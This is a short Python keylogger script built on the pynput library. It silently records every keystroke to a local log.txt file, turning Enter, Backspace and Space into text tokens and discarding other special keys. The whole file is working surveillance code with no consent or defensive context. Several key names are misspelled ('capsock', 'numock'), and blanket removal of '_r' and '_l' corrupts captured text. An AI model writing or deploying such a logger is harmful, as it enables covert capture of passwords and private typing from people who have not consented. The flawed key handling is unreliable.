import pynput, os



with open("log.txt","a") as file:
    if(os.stat("log.txt").st_size!=0):
        file.write("\n")

def write(key):
    letter=str(key)

    letter=letter.replace("'","")
    letter=letter.replace("Key.enter","{enter}")
    letter=letter.replace("Key.backspace","{bs}")
    letter=letter.replace("Key.capsock","{cl}")
    letter=letter.replace("Key.space"," ")
    letter=letter.replace("Key.shift","")
    letter=letter.replace("_r","")
    letter=letter.replace("_l","")
    letter=letter.replace("Key.ctrl_l","")
    letter=letter.replace("Key.ctrl","")
    letter=letter.replace("Key.tab","")
    letter=letter.replace("Key.up","")
    letter=letter.replace("Key.down","")
    letter=letter.replace("Key.left","")
    letter=letter.replace("Key.right","")
    letter=letter.replace("Key.menu","")
    letter=letter.replace("Key.alt","")
    letter=letter.replace("Key.cmd","")
    letter=letter.replace("Key.alt_l","")
    letter=letter.replace("Key.delete","")
    letter=letter.replace("Key.numock","")
    letter=letter.replace("Key.esc","")

    with open("log.txt","a") as file:
        file.write(letter)

with pynput.keyboard.Listener(on_press=write) as listener:
    listener.join()
